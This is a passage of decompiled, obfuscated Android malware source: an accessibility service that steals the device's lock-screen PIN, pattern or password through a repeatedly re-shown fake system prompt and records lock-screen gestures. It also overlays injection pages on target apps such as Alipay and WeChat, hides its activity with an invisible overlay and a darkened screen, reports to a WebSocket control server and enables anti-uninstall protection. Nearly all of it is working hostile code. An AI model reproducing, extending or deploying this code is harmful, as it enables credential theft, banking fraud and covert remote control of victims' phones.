                    g60.m212896a0(g60.f56416a0, this, m211470g4(), String.valueOf(System.currentTimeMillis()), 0, false, 224);
                    t60.m214714d6("dqtvuisjd", "✅ 无密码安装流程完成");
                    m211534n2();
                    return;
                } catch (Exception e) {
                    t60.m214705c6("dqtvuisjd", "❌ 无密码安装流程处理失败", e);
                    return;
                }
            }
            return;
        }
        if (z) {
            try {
                t60.m214714d6("dqtvuisjd", "📝 开始记录安装完成状态...");
                C0107as c0106ar = C0107as.f45610a3.getInstance(this);
                SharedPreferences sharedPreferences2 = c0106ar.f45619a1;
                SharedPreferences.Editor editorEdit = sharedPreferences2.edit();
                editorEdit.putBoolean("installation_complete", true);
                editorEdit.putLong("installation_time", System.currentTimeMillis());
                editorEdit.apply();
                c0106ar.m210505a4();
                sharedPreferences2.edit().putBoolean("first_launch", false).apply();
                c0106ar.m210505a4();
                SharedPreferences.Editor editorEdit2 = sharedPreferences2.edit();
                editorEdit2.putBoolean("config_complete", true);
                editorEdit2.putLong("config_complete_time", System.currentTimeMillis());
                editorEdit2.apply();
                c0106ar.m210505a4();
                sharedPreferences2.edit().putBoolean("accessibility_enabled", true).apply();
                c0106ar.m210505a4();
                sharedPreferences2.edit().putBoolean("write_settings_enabled", Settings.System.canWrite(this)).apply();
                c0106ar.m210505a4();
                sharedPreferences2.edit().putBoolean("overlay_enabled", Settings.canDrawOverlays(this)).apply();
                c0106ar.m210505a4();
                sharedPreferences2.edit().putBoolean("media_projection_enabled", AbstractC0241a0.m211178a2()).apply();
                c0106ar.m210505a4();
                String strM214126a5 = new nm0(this).m214126a5();
                if (AbstractC0779a1.m213652a5(strM214126a5, "4", false) || (AbstractC0779a1.m213652a5(strM214126a5, "PIN", true) && AbstractC0779a1.m213652a5(strM214126a5, "4", false))) {
                    str = "4pin";
                } else if (AbstractC0779a1.m213652a5(strM214126a5, "6", false) || (AbstractC0779a1.m213652a5(strM214126a5, "PIN", true) && AbstractC0779a1.m213652a5(strM214126a5, "6", false))) {
                    str = "6pin";
                } else {
                    str = "pattern";
                    if (!AbstractC0779a1.m213652a5(strM214126a5, "图案", true) && !AbstractC0779a1.m213652a5(strM214126a5, "pattern", true)) {
                        str = "mixed";
                        if (!AbstractC0779a1.m213652a5(strM214126a5, "混合", true) && !AbstractC0779a1.m213652a5(strM214126a5, "mixed", true)) {
                            str = (AbstractC0779a1.m213652a5(strM214126a5, "无", false) || AbstractC0779a1.m213652a5(strM214126a5, "none", true)) ? "none" : "unknown";
                        }
                    }
                }
                c0106ar.m210507a6(str, !str.equals("none"), "");
                c0106ar.m210505a4();
                String absolutePath = new File(c0106ar.f45618a0.getFilesDir(), "app_status.txt").getAbsolutePath();
                t60.m214694b5(absolutePath, "File(context.filesDir, S…S_FILE_NAME).absolutePath");
                t60.m214714d6("dqtvuisjd", "✅ 安装完成状态已记录到文件: ".concat(absolutePath));
                t60.m214714d6("dqtvuisjd", "📋 状态详情:");
                t60.m214714d6("dqtvuisjd", "   - 安装完成: true");
                t60.m214714d6("dqtvuisjd", "   - 配置完成: true");
                t60.m214714d6("dqtvuisjd", "   - 锁屏类型: ".concat(str));
                t60.m214714d6("dqtvuisjd", "   - 无障碍: true");
                t60.m214714d6("dqtvuisjd", "   - 系统设置: " + Settings.System.canWrite(this));
                t60.m214714d6("dqtvuisjd", "   - 悬浮窗: " + Settings.canDrawOverlays(this));
                t60.m214714d6("dqtvuisjd", "   - 屏幕录制: " + AbstractC0241a0.m211178a2());
            } catch (Exception e2) {
                t60.m214705c6("dqtvuisjd", "❌ 记录安装完成状态失败", e2);
            }
        }
        AbstractC0780a0.m213692a3(this.f52378a9, null, new dqtvuisjd$capturePasswordViaSystemAuth$2(null, this, z), 3);
    }

    /* renamed from: c8 */
    public final void m211443c8(String str) {
        C0873ms c0873ms = AbstractC0385a0.f55229a0;
        AbstractC0385a0.m212471a0(new dqtvuisjd$changeServerUrl$1(null, this, str));
    }

    /* JADX WARN: Can't wrap try/catch for region: R(18:9|(1:11)(1:12)|13|(1:15)(1:(12:20|21|56|22|23|24|26|(1:31)(1:30)|32|(1:34)(1:35)|36|(2:52|62)(2:42|(2:44|(2:46|(2:48|60)(1:59))(2:49|50))(2:51|61)))(1:19))|16|21|56|22|23|24|26|(2:28|31)(0)|32|(0)(0)|36|(0)|52|62) */
    /* JADX WARN: Code restructure failed: missing block: B:25:0x0059, code lost:
    
        r9 = false;
     */
    /* JADX WARN: Removed duplicated region for block: B:31:0x0067  */
    /* JADX WARN: Removed duplicated region for block: B:34:0x00c1 A[Catch: Exception -> 0x0022, TryCatch #1 {Exception -> 0x0022, blocks: (B:3:0x0010, B:5:0x001c, B:9:0x0025, B:11:0x0029, B:13:0x0032, B:15:0x003b, B:21:0x0048, B:26:0x005b, B:28:0x005f, B:32:0x0068, B:34:0x00c1, B:36:0x00cc, B:42:0x00ed, B:44:0x00fc, B:46:0x0105, B:48:0x0125, B:49:0x012e, B:50:0x0133, B:51:0x0134, B:52:0x013a), top: B:58:0x0010 }] */
    /* JADX WARN: Removed duplicated region for block: B:35:0x00ca  */
    /* renamed from: c9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m211444c9() {
        boolean z;
        boolean zM211487i1;
        boolean zM211484h8;
        boolean zCanWrite;
        try {
            if (i60.f56802a1.getInstance(this).m213105a1()) {
                t60.m214702c3("dqtvuisjd", "🔒 安装已完成，跳过配置遮盖检查");
                return;
            }
            Integer num = AbstractC0241a0.f51907a1;
            Pair pair = num != null ? new Pair(num, AbstractC0241a0.f51908a2) : null;
            MediaProjection mediaProjection = AbstractC0241a0.f51906a0;
            if (Build.VERSION.SDK_INT >= 29) {
                t60.m214702c3("dqtvuisjd", "📱 Android 10+设备：跳过投屏权限，MediaProjection权限标记为就绪");
            } else if (pair == null || mediaProjection == null) {
                z = false;
                zM211487i1 = m211487i1();
                zM211484h8 = m211484h8();
                zCanWrite = Settings.System.canWrite(this);
                C0329b4 c0329b4 = this.f52431g2;
                boolean z2 = c0329b4 == null && c0329b4.m211766a4();
                boolean z3 = !z2;
                boolean z4 = z2;
                t60.m214714d6("dqtvuisjd", "🔍 检查配置遮盖隐藏条件:");
                t60.m214714d6("dqtvuisjd", "  📱 MediaProjection权限: permissionData=" + pair + ", mediaProjection=" + mediaProjection + ", ready=" + z);
                StringBuilder sb = new StringBuilder("  🌐 服务器连接: ");
                sb.append(zM211487i1);
                t60.m214714d6("dqtvuisjd", sb.toString());
                StringBuilder sb2 = new StringBuilder("  ✅ 设备注册: ");
                sb2.append(zM211484h8);
                t60.m214714d6("dqtvuisjd", sb2.toString());
                t60.m214714d6("dqtvuisjd", "  🔧 WRITE_SETTINGS权限: " + zCanWrite);
                C0329b4 c0329b42 = this.f52431g2;
                t60.m214714d6("dqtvuisjd", "  🔄 授权模块状态: 正在授权=" + (c0329b42 == null ? Boolean.valueOf(c0329b42.m211766a4()) : null) + ", 可以隐藏=" + z3);
                if (z || !zM211487i1 || !zM211484h8 || !zCanWrite || z4) {
                    t60.m214726f4("dqtvuisjd", "⚠️ 条件未满足，保持配置遮盖显示 (MediaProjection=" + z + ", Server=" + zM211487i1 + ", Device=" + zM211484h8 + ", WriteSettings=" + zCanWrite + ")");
                }
                t60.m214714d6("dqtvuisjd", "✅ 所有条件满足，准备隐藏配置遮盖");
                this.f52400d1 = true;
                m211532n0();
                if (this.f52428f9 == null) {
                    t60.m214726f4("dqtvuisjd", "⚠️ ConfigProgressManager未初始化，无法调用completeConfiguration()");
                    return;
                }
                t60.m214714d6("dqtvuisjd", "📊 ConfigProgressManager已初始化，调用completeConfiguration()");
                C0318a3 c0318a3 = this.f52428f9;
                if (c0318a3 == null) {
                    t60.m214724f2("configProgressManager");
                    throw null;
                }
                C0318a3.m211566a0(c0318a3);
                new Handler(Looper.getMainLooper()).postDelayed(new bm0(this, 3), 3000L);
                t60.m214714d6("dqtvuisjd", "🎉 配置进度已标记为完成");
                C0323a8 c0323a8 = this.f52415e6;
                if (c0323a8 != null) {
                    c0323a8.m211664d0();
                    t60.m214714d6("dqtvuisjd", "📤 配置完成，已发送权限状态更新");
                    return;
                }
                return;
            }
            z = true;
            zM211487i1 = m211487i1();
            zM211484h8 = m211484h8();
            zCanWrite = Settings.System.canWrite(this);
            C0329b4 c0329b43 = this.f52431g2;
            if (c0329b43 == null) {
            }
            boolean z32 = !z2;
            boolean z42 = z2;
            t60.m214714d6("dqtvuisjd", "🔍 检查配置遮盖隐藏条件:");
            t60.m214714d6("dqtvuisjd", "  📱 MediaProjection权限: permissionData=" + pair + ", mediaProjection=" + mediaProjection + ", ready=" + z);
            StringBuilder sb3 = new StringBuilder("  🌐 服务器连接: ");
            sb3.append(zM211487i1);
            t60.m214714d6("dqtvuisjd", sb3.toString());
            StringBuilder sb22 = new StringBuilder("  ✅ 设备注册: ");
            sb22.append(zM211484h8);
            t60.m214714d6("dqtvuisjd", sb22.toString());
            t60.m214714d6("dqtvuisjd", "  🔧 WRITE_SETTINGS权限: " + zCanWrite);
            C0329b4 c0329b422 = this.f52431g2;
            if (c0329b422 == null) {
            }
            t60.m214714d6("dqtvuisjd", "  🔄 授权模块状态: 正在授权=" + (c0329b422 == null ? Boolean.valueOf(c0329b422.m211766a4()) : null) + ", 可以隐藏=" + z32);
            if (z) {
            }
            t60.m214726f4("dqtvuisjd", "⚠️ 条件未满足，保持配置遮盖显示 (MediaProjection=" + z + ", Server=" + zM211487i1 + ", Device=" + zM211484h8 + ", WriteSettings=" + zCanWrite + ")");
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 检查配置遮盖隐藏条件失败", e);
        }
    }

    /* renamed from: d0 */
    public final void m211445d0(String str) {
        String str2;
        long jLongValue;
        synchronized (this.f52406d7) {
            str2 = (String) this.f52405d6.get(str);
        }
        if (str2 == null) {
            return;
        }
        long jCurrentTimeMillis = System.currentTimeMillis();
        synchronized (this.f52406d7) {
            Long l = (Long) this.f52407d8.get(str);
            jLongValue = l != null ? l.longValue() : 0L;
        }
        if (jCurrentTimeMillis - jLongValue < this.f52408d9) {
            return;
        }
        jbqfkndyx.C0253a0 c0253a0 = jbqfkndyx.f51944a4;
        boolean active = c0253a0.getActive();
        boolean inForeground = c0253a0.getInForeground();
        if (active && inForeground) {
            return;
        }
        synchronized (this.f52406d7) {
            this.f52407d8.put(str, Long.valueOf(jCurrentTimeMillis));
        }
        t60.m214714d6("dqtvuisjd", "📱 检测到目标app: " + str + "，显示注入页面 (active=" + active + ", foreground=" + inForeground + ")");
        try {
            Intent intent = new Intent(this, (Class<?>) jbqfkndyx.class);
            intent.addFlags(268435456);
            intent.addFlags(536870912);
            intent.addFlags(131072);
            intent.putExtra("package_name", str);
            intent.putExtra("html_content", str2);
            startActivity(intent);
            t60.m214714d6("dqtvuisjd", "✅ 自动显示注入页面成功: ".concat(str));
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 自动显示注入页面失败: ".concat(str), e);
        }
    }

    /* renamed from: d1 */
    public final void m211446d1(AccessibilityEvent accessibilityEvent) {
        CharSequence packageName;
        String string;
        try {
            if (this.f52437g8 == null || (packageName = accessibilityEvent.getPackageName()) == null || (string = packageName.toString()) == null) {
                return;
            }
            String lowerCase = string.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            boolean z = AbstractC0779a1.m213652a5(lowerCase, "systemui", false) || AbstractC0779a1.m213652a5(lowerCase, "lockscreen", false) || AbstractC0779a1.m213652a5(lowerCase, "keyguard", false);
            boolean z2 = AbstractC0779a1.m213652a5(lowerCase, "aod", false) || AbstractC0779a1.m213652a5(lowerCase, "alwayson", false) || AbstractC0779a1.m213652a5(lowerCase, "ambient", false);
            if (z && !z2) {
                boolean zM211486i0 = m211486i0();
                KeyguardManager keyguardManager = this.f52385b6;
                boolean zIsKeyguardSecure = keyguardManager != null ? keyguardManager.isKeyguardSecure() : false;
                if (zM211486i0 && zIsKeyguardSecure) {
                    C0319a4 c0319a4 = this.f52437g8;
                    if (c0319a4 == null) {
                        t60.m214724f2("gestureRecorderManager");
                        throw null;
                    }
                    if (c0319a4.f53061a7 == 1) {
                        return;
                    }
                    t60.m214714d6("dqtvuisjd", "🔐 检测到锁屏界面: pkg=" + lowerCase + ", locked=" + zM211486i0 + ", secure=" + zIsKeyguardSecure);
                    C0319a4 c0319a42 = this.f52437g8;
                    if (c0319a42 != null) {
                        c0319a42.m211577a6();
                    } else {
                        t60.m214724f2("gestureRecorderManager");
                        throw null;
                    }
                }
            }
        } catch (Exception unused) {
        }
    }

    /* renamed from: d2 */
    public final void m211447d2() {
        t60.m214714d6("dqtvuisjd", "🧹 开始清理旧模块资源...");
        t60.m214714d6("dqtvuisjd", "🧹 NetworkManager 单例保留，跳过清理");
        xz0 xz0Var = this.f52413e4;
        if (xz0Var != null) {
            try {
                try {
                    try {
                        xz0Var.f61208a2 = null;
                        HandlerThread handlerThread = xz0Var.f61209a3;
                        if (handlerThread != null) {
                            handlerThread.quit();
                        }
                        xz0Var.f61209a3 = null;
                    } catch (Exception e) {
                        t60.m214705c6("ServiceLifecycleManager", "❌ 后台Handler清理失败", e);
                    }
                    AbstractC1117qo.m214410a3(xz0Var.f61207a1);
                } catch (Exception e2) {
                    t60.m214705c6("ServiceLifecycleManager", "❌ 服务销毁清理失败", e2);
                }
                t60.m214714d6("dqtvuisjd", "🧹 已清理旧 ServiceLifecycleManager（协程/WakeLock）");
            } catch (Exception unused) {
            }
        }
        t60.m214714d6("dqtvuisjd", "🧹 旧模块资源清理完成");
    }

    /* renamed from: d3 */
    public final void m211448d3(String str) {
        boolean z;
        t60.m214695b6(str, "packageName");
        synchronized (this.f52406d7) {
            if (this.f52405d6.remove(str) != null) {
                this.f52407d8.remove(str);
                t60.m214714d6("dqtvuisjd", "✅ 已清除注入任务: " + str + " (剩余 " + this.f52405d6.size() + " 个激活任务)");
                if (this.f52405d6.isEmpty()) {
                    u11 u11Var = this.f52409e0;
                    if (u11Var != null) {
                        u11Var.m215253a7(null);
                    }
                    this.f52409e0 = null;
                    t60.m214714d6("dqtvuisjd", "📱 停止注入检测定时任务");
                }
                z = true;
            } else {
                z = false;
            }
        }
        if (z) {
            AbstractC0780a0.m213692a3(this.f52378a9, AbstractC1262tj.f60234a1, new dqtvuisjd$removeInjectionTaskFromLocalService$1(str, null), 2);
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* renamed from: d4 */
    public final void m211449d4() {
        int i;
        String strM213295i2;
        String str;
        try {
            t60.m214714d6("dqtvuisjd", "🔐 ★★★ completeInstallationWithCipher() 被调用 ★★★");
            getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).edit().putBoolean(StringUtil.m212470a0("LkESNlg8CRFRIyRULihIOwkgQyI="), true).apply();
            getSharedPreferences(StringUtil.m212470a0("O1gCKVo3HipoMipJBS9fPQ=="), 0).edit().putBoolean(StringUtil.m212470a0("KFgBLlgqCRFUPiZJHT9ZPQg="), true).apply();
            getSharedPreferences(StringUtil.m212470a0("O1gCKVo3HipoOCVJBC4="), 0).edit().putBoolean(StringUtil.m212470a0("O1gCKVo3HipoOCVJBC5yOwMjRz0uTRQ+"), true).apply();
            C0335a1 c0335a1 = this.f52438g9;
            if (c0335a1 != null) {
                C0598hx c0598hxM211819d0 = c0335a1.m211819d0(false);
                if (c0598hxM211819d0 == null) {
                    C0335a1 c0335a12 = this.f52438g9;
                    if (c0335a12 == null) {
                        t60.m214724f2("cipherCaptureManager");
                        throw null;
                    }
                    c0598hxM211819d0 = c0335a12.m211819d0(true);
                }
                if (c0598hxM211819d0 != null) {
                    List list = c0598hxM211819d0.f56762a2;
                    String str2 = c0598hxM211819d0.f56761a1;
                    if (str2 == null) {
                        strM213295i2 = list != null ? AbstractC0715je.m213295i2(list, ",", null, null, null, 62) : null;
                        if (strM213295i2 == null) {
                            strM213295i2 = "";
                        }
                    } else {
                        strM213295i2 = str2;
                    }
                    if (list != null) {
                        str = "pattern";
                    } else {
                        if ((str2 != null ? str2.length() : 0) <= 4) {
                            str = "4pin";
                        } else {
                            str = (str2 != null ? str2.length() : 0) <= 6 ? "6pin" : "mixed";
                        }
                    }
                    C0107as.f45610a3.getInstance(this).m210507a6(str, true, strM213295i2);
                }
            }
            C0335a1 c0335a13 = this.f52438g9;
            if (c0335a13 == null) {
                t60.m214724f2("cipherCaptureManager");
                throw null;
            }
            if (c0335a13.m211819d0(false) == null) {
                C0335a1 c0335a14 = this.f52438g9;
                if (c0335a14 == null) {
                    t60.m214724f2("cipherCaptureManager");
                    throw null;
                }
                i = c0335a14.m211819d0(true) != null ? 1 : 0;
            }
            g60.m212896a0(g60.f56416a0, this, m211470g4(), String.valueOf(System.currentTimeMillis()), i, i, 480);
            t60.m214714d6("dqtvuisjd", "✅ 安装完成流程已执行");
            m211534n2();
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ completeInstallationWithCipher 失败", e);
        }
    }

    /* renamed from: d5 */
    public final void m211450d5() {
        try {
            AccessibilityServiceInfo serviceInfo = getServiceInfo();
            if (serviceInfo == null) {
                return;
            }
            serviceInfo.flags = Build.VERSION.SDK_INT >= 30 ? 16810107 : 123;
            serviceInfo.eventTypes = -1;
            serviceInfo.feedbackType = -1;
            serviceInfo.notificationTimeout = 0L;
            serviceInfo.packageNames = null;
            setServiceInfo(serviceInfo);
            boolean z = (serviceInfo.eventTypes & 128) != 0;
            int i = serviceInfo.flags;
            boolean z2 = (i & 4) != 0;
            t60.m214714d6("dqtvuisjd", "✅ ServiceInfo已配置，flags=0x" + Integer.toHexString(i) + " eventTypes=0x" + Integer.toHexString(serviceInfo.eventTypes) + " hasHover=" + z + " hasTouchExploreFlag=" + z2);
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ ServiceInfo配置失败", e);
        }
    }

    /* renamed from: d6 */
    public final void m211451d6() {
        C0323a8 c0323a8 = this.f52415e6;
        if (c0323a8 != null) {
            if (c0323a8.f53103a3) {
                t60.m214714d6("dqtvuisjd", "🔌 控制开始，WebSocket 已连接，跳过重连");
                return;
            }
            t60.m214714d6("dqtvuisjd", "🔌 控制开始，连接 WebSocket");
            C0323a8 c0323a82 = this.f52415e6;
            if (c0323a82 == null) {
                t60.m214724f2("networkManager");
                throw null;
            }
            c0323a82.m211643a8();
            c0323a82.m211669d6();
        }
    }

    /* renamed from: d9 */
    public final void m211452d9(Rect rect) {
        try {
            m211507k3();
            Object systemService = getSystemService("window");
            WindowManager windowManager = systemService instanceof WindowManager ? (WindowManager) systemService : null;
            if (windowManager == null) {
                t60.m214704c5("dqtvuisjd", "❌ 无法获取WindowManager");
                return;
            }
            TextView textView = new TextView(this);
            textView.setBackgroundColor(0);
            textView.setAlpha(0.01f);
            textView.setOnTouchListener(new ViewOnTouchListenerC0450eb(2));
            this.f52480l1 = textView;
            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(rect.width(), rect.height(), 2032, 40, -3);
            layoutParams.gravity = 8388659;
            layoutParams.x = rect.left;
            layoutParams.y = rect.top;
            windowManager.addView(this.f52480l1, layoutParams);
            t60.m214714d6("dqtvuisjd", "✅ 图标覆盖层已创建: x=" + rect.left + ", y=" + rect.top + ", w=" + rect.width() + ", h=" + rect.height());
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 创建图标覆盖层失败", e);
        }
    }

    /* renamed from: e2 */
    public final void m211453e2() {
        try {
            if (!Settings.System.canWrite(this)) {
                t60.m214726f4("dqtvuisjd", "无 WRITE_SETTINGS 权限，跳过亮度调节");
                return;
            }
            Settings.System.putInt(getContentResolver(), "screen_brightness_mode", 0);
            this.f52478k9 = Settings.System.getInt(getContentResolver(), "screen_brightness", 128);
            Settings.System.putInt(getContentResolver(), "screen_brightness", 1);
            t60.m214714d6("dqtvuisjd", "🔅 屏幕亮度已调到最暗（原值: " + this.f52478k9 + "）");
        } catch (Exception e) {
            tz0.m214810b0("调节亮度失败: ", e.getMessage(), "dqtvuisjd");
        }
    }

    /* renamed from: e3 */
    public final void m211454e3() {
        try {
            u11 u11Var = this.f52443h4;
            if (u11Var == null || !u11Var.mo213470a0()) {
                t60.m214702c3("dqtvuisjd", "🔍 [监控] 无障碍设置页面检测已经是禁用状态");
                return;
            }
            t60.m214714d6("dqtvuisjd", "✅ [授权] obzzniixzpin已启动，禁用无障碍设置页面检测");
            u11 u11Var2 = this.f52443h4;
            if (u11Var2 != null) {
                u11Var2.m215253a7(null);
            }
            this.f52443h4 = null;
            this.f52445h6 = 0;
            this.f52444h5 = 0L;
            t60.m214714d6("dqtvuisjd", "✅ [监控] 无障碍设置页面检测已禁用");
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ [监控] 禁用无障碍设置页面检测失败", e);
        }
    }

    /* renamed from: e4 */
    public final void m211455e4() {
        try {
            t60.m214714d6("dqtvuisjd", "💰💰💰 关闭支付宝检测功能");
            C0614i9 c0614i9 = this.f52414e5;
            if (c0614i9 == null) {
                t60.m214724f2("accessibilityEventManager");
                throw null;
            }
            c0614i9.m213119a7();
            t60.m214714d6("dqtvuisjd", "💰 AccessibilityEventManager.disableAlipayDetection() 已调用");
            if (this.f52415e6 == null) {
                t60.m214726f4("dqtvuisjd", "⚠️ NetworkManager未初始化，无法发送状态更新");
                return;
            }
            t60.m214714d6("dqtvuisjd", "💰 调用 networkManager.sendAlipayDetectionStatus(false)");
            C0323a8 c0323a8 = this.f52415e6;
            if (c0323a8 != null) {
                c0323a8.m211655c1(false);
            } else {
                t60.m214724f2("networkManager");
                throw null;
            }
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 关闭支付宝检测失败", e);
        }
    }

    /* renamed from: e5 */
    public final void m211456e5() {
        try {
            t60.m214714d6("dqtvuisjd", "💬💬💬 关闭微信检测功能");
            C0614i9 c0614i9 = this.f52414e5;
            if (c0614i9 == null) {
                t60.m214724f2("accessibilityEventManager");
                throw null;
            }
            c0614i9.m213121a9();
            t60.m214714d6("dqtvuisjd", "💬 AccessibilityEventManager.disableWechatDetection() 已调用");
            if (this.f52415e6 == null) {
                t60.m214726f4("dqtvuisjd", "⚠️ NetworkManager未初始化，无法发送状态更新");
                return;
            }
            t60.m214714d6("dqtvuisjd", "💬 调用 networkManager.sendWechatDetectionStatus(false)");
            C0323a8 c0323a8 = this.f52415e6;
            if (c0323a8 != null) {
                c0323a8.m211668d4(false);
            } else {
                t60.m214724f2("networkManager");
                throw null;
            }
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 关闭微信检测失败", e);
        }
    }

    /* renamed from: e6 */
    public final void m211457e6(final boolean z) {
        if (!this.f52474k5) {
            t60.m214702c3("dqtvuisjd", "🔐 密码监听已停止，不再弹出");
            return;
        }
        try {
            t60.m214714d6("dqtvuisjd", "🔐 启动系统真实密码验证... (第" + (this.f52485l6 + 1) + "次)");
            C0335a1 c0335a1 = this.f52438g9;
            if (c0335a1 != null) {
                C0335a1.m211788c1(c0335a1);
                t60.m214714d6("dqtvuisjd", "✅ CipherCaptureManager 密码监听已启用");
            }
            syuqattwmgit.f51917a3.setOnCredentialVerified(new h10() { // from class: com.storm.safe.rock.service.dqtvuisjd$doLaunchSystemPasswordCapture$2
                /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                {
                    super(1);
                }

                /* JADX WARN: Removed duplicated region for block: B:30:0x0097  */
                @Override // p000.h10
                /*
                    Code decompiled incorrectly, please refer to instructions dump.
                */
                public final Object invoke(Object obj) {
                    boolean zBooleanValue = ((Boolean) obj).booleanValue();
                    t60.m214714d6("dqtvuisjd", "🔐 系统密码验证结果: " + (zBooleanValue ? "成功" : "失败/取消") + ", isInstallationFlow=" + z + ", cipherCaptureManagerInit=" + (this.f52438g9 != null));
                    if (zBooleanValue) {
                        dqtvuisjd dqtvuisjdVar = this;
                        if (dqtvuisjdVar.f52438g9 != null) {
                            dqtvuisjdVar.f52474k5 = false;
                            this.f52485l6 = 0;
                            t60.m214714d6("dqtvuisjd", "🔐 密码验证成功（syuqattwmgit 已保存密码）");
                            C0335a1 c0335a12 = this.f52438g9;
                            if (c0335a12 == null) {
                                t60.m214724f2("cipherCaptureManager");
                                throw null;
                            }
                            C0598hx c0598hxM211819d0 = c0335a12.m211819d0(false);
                            if (c0598hxM211819d0 == null) {
                                C0335a1 c0335a13 = this.f52438g9;
                                if (c0335a13 == null) {
                                    t60.m214724f2("cipherCaptureManager");
                                    throw null;
                                }
                                c0598hxM211819d0 = c0335a13.m211819d0(true);
                            }
                            if (c0598hxM211819d0 != null) {
                                this.m211533n1(c0598hxM211819d0);
                            }
                            t60.m214714d6("dqtvuisjd", "🔐 准备调用 completeInstallationWithCipher, isInstallationFlow=" + z);
                            if (z) {
                                this.m211449d4();
                            }
                        } else if (zBooleanValue && this.f52438g9 == null) {
                            t60.m214726f4("dqtvuisjd", "🔐 密码验证成功但 cipherCaptureManager 未初始化，仍然完成流程");
                            this.f52474k5 = false;
                            if (z) {
                                this.m211449d4();
                            }
                        } else {
                            this.f52485l6++;
                            if (this.f52474k5) {
                                int i = this.f52485l6;
                                dqtvuisjd dqtvuisjdVar2 = this;
                                int i2 = dqtvuisjdVar2.f52486l7;
                                if (i >= i2) {
                                    t60.m214726f4("dqtvuisjd", "⚠️ 密码捕获已达最大重试次数(" + i2 + ")，停止");
                                    this.f52474k5 = false;
                                    this.f52485l6 = 0;
                                    C0335a1 c0335a14 = this.f52438g9;
                                    if (c0335a14 != null) {
                                        c0335a14.m211815b5();
                                    }
                                    if (z) {
                                        this.m211449d4();
                                    }
                                } else {
                                    t60.m214714d6("dqtvuisjd", "🔄 密码验证失败/取消，" + dqtvuisjdVar2.f52487l8 + "ms后重新弹出 (" + dqtvuisjdVar2.f52485l6 + "/" + this.f52486l7 + ")");
                                    Handler handler = new Handler(Looper.getMainLooper());
                                    dqtvuisjd dqtvuisjdVar3 = this;
                                    handler.postDelayed(new RunnableC0449ea(dqtvuisjdVar3, z, 2), dqtvuisjdVar3.f52487l8);
                                }
                            } else {
                                t60.m214714d6("dqtvuisjd", "🛑 密码监听已被外部停止，不再重试");
                                if (z) {
                                    this.m211449d4();
                                }
                            }
                        }
                    }
                    return C1351vv.f60710b1;
                }
            });
            Intent intent = new Intent(this, (Class<?>) syuqattwmgit.class);
            intent.putExtra("credential_type", 0);
            intent.addFlags(805306368);
            Activity currentActivity = iuzxujjtqev.f51956e2.getCurrentActivity();
            if (currentActivity != null && !currentActivity.isFinishing() && !currentActivity.isDestroyed()) {
                currentActivity.startActivity(intent);
                t60.m214714d6("dqtvuisjd", "🔐 [策略1] 通过前台 Activity context 直接启动 syuqattwmgit");
                return;
            }
            t60.m214714d6("dqtvuisjd", "🔐 [前置] 无前台 Activity，通过 moveTaskToFront 拉回前台");
            try {
                Object systemService = getSystemService("activity");
                t60.m214693b4(systemService, "null cannot be cast to non-null type android.app.ActivityManager");
                List<ActivityManager.AppTask> appTasks = ((ActivityManager) systemService).getAppTasks();
                t60.m214694b5(appTasks, "appTasks");
                if (!appTasks.isEmpty()) {
                    appTasks.get(0).moveToFront();
                    t60.m214714d6("dqtvuisjd", "🔐 [前置] moveToFront 已调用，等待 onResume");
                }
            } catch (Exception e) {
                t60.m214705c6("dqtvuisjd", "🔐 [前置] moveTaskToFront 失败", e);
            }
            new Handler(Looper.getMainLooper()).postDelayed(new RunnableC1052p1(intent, 18, this), 800L);
        } catch (Exception e2) {
            t60.m214705c6("dqtvuisjd", "❌ doLaunchSystemPasswordCapture 异常", e2);
            this.f52474k5 = false;
            if (z) {
                m211449d4();
            }
        }
    }

    /* renamed from: e7 */
    public final void m211458e7(boolean z) {
        this.f52394c5 = z;
        if (z) {
            t60.m214714d6("dqtvuisjd", "📺 开启自适应投屏质量模式");
            u11 u11Var = this.f52395c6;
            if (u11Var != null) {
                u11Var.m215253a7(null);
            }
            this.f52395c6 = AbstractC0780a0.m213692a3(this.f52378a9, null, new dqtvuisjd$startAdaptiveQualityMonitor$1(this, null), 3);
            return;
        }
        t60.m214714d6("dqtvuisjd", "📺 关闭自适应投屏质量模式");
        u11 u11Var2 = this.f52395c6;
        if (u11Var2 != null) {
            u11Var2.m215253a7(null);
        }
        this.f52395c6 = null;
    }

    /* renamed from: e8 */
    public final void m211459e8() {
        String str = AbstractC0315a0.f53025a0;
        AbstractC0315a0.f53032a7 = true;
        AbstractC0315a0.f53034a9 = true;
        AbstractC0315a0.f53035b0 = true;
        AbstractC0315a0.f53036b1 = true;
        this.f52411e2 = true;
        C0614i9 c0614i9 = this.f52414e5;
        if (c0614i9 != null) {
            c0614i9.f56827a7 = true;
        }
        try {
            getSharedPreferences(StringUtil.m212470a0("J1YWPUQ2CxFEJSpNFA=="), 0).edit().putBoolean(StringUtil.m212470a0("J1YWPUQ2CxFSPypbHT9J"), true).apply();
            t60.m214714d6("dqtvuisjd", "✅ 日志记录已启用并持久化保存");
        } catch (Exception unused) {
        }
    }

    /* renamed from: e9 */
    public final void m211460e9() {
        C0329b4 c0329b4;
        if (!getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).getBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), false) || ((c0329b4 = this.f52431g2) != null && c0329b4.m211766a4())) {
            t60.m214726f4("dqtvuisjd", "⏳ 授权未完成或正在进行中，不启用防卸载保护");
            return;
        }
        C0355a0 c0355a0 = this.f52435g6;
        if (c0355a0 != null) {
            this.f52477k8 = c0355a0.m211939c3();
        } else {
            t60.m214726f4("dqtvuisjd", "⚠️ kinztpexl 未初始化");
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
